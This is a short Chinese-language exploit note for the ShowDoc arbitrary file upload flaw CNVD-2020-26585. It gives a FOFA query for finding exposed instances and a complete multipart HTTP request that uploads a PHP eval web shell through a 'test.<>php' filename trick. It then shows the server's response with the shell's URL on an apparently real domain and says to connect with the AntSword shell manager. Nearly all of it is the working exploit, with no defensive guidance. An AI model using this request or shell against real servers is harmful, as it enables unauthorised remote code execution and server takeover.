# showdoc 文件上传 （CNVD-2020-26585）

## 01、简述

ShowDoc一个非常适合IT团队的在线[API](https://so.csdn.net/so/search?q=API&spm=1001.2101.3001.7020)文档、技术文档工具。 api_page存在任意文件上传

## 02、fofa语句

```
app=“ShowDoc”
```

## 03、利用过程

```POST /index.php?s=/home/page/uploadImg HTTP/2
POST /index.php?s=/home/page/uploadImg HTTP/2
Host: xxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Content-Length: 252

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php @eval($_POST[a]);?>  
----------------------------921378126371623762173617--```
```

```HTTP/2 200 OK
{"url":"https:\/\/doc.mfstudio.cc\/Public\/Uploads\/2022-04-12\/6254edcbb57d7.php","success":1}```
```

使用蚁剑连接即可

## 04、参考

https://blog.csdn.net/YouthBelief/article/details/121343974

![showdoc](\showdoc.png)